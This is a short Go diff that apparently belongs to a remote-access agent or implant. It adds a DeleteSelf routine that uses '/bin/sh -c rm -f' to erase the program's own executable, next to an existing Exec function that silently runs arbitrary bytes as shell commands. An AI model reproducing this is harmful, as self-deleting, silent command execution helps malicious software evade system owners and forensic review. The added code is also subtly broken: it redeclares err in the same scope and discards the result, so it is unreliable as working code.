@@ -9,6 +9,18 @@ import (
 	"strings"
 )
 
+// unchecked
+func DeleteSelf() {
+	if config.DeleteSelf {
+		selfName, err := os.Executable()
+		if err != nil {
+			return
+		}
+		cmd := exec.Command("/bin/sh", "-c", "rm -f "+string(selfName))
+		err := cmd.Start()
+	}
+}
+
 // no echo
 func Exec(b []byte) error {
 	cmd := exec.Command("/bin/sh", "-c", string(b))
